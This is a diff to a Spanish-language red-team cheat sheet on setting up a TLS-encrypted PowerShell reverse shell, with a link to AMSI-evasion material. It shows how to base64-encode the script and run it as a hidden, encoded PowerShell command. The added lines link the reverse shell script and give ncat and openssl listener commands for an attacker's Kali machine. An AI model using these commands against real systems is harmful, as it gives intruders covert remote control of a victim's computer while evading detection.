@@ -1,6 +1,6 @@
 ## **TCP Reverse Shell mediante TLS en Powershell**
 
-Todos los agradecimientos a estos dos enlaces, esto no es más que casi un copia y pega:
+Todos los agradecimientos a estos dos enlaces, es puro virtuosismo lo que hay ahí, esto no es más que un copia y pega:
 
 https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/
 
@@ -42,5 +42,15 @@ cat tlsrevshell.ps1 | iconv -f UTF8 -t UTF16LE | base64 -w 0
 **4.- Ejecutarlo desde consola PS **
 ```
 powershell -noP -sta -w 1 -enc ENC64SCRIPT
+```
+
+Como muestra de estás técnicas os dejo el [TCP reverse shell con TLS](https://github.com/g4ngli0s/chuletas/blob/master/bypasspowershell/tlsrevshell.ps1), como listener en vuestra máquina kali podeís usar ncat u openssl:
+
+```
+ncat --allow <IP> -vnl <PORT> --ssl
+```
+```
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
 ```
 
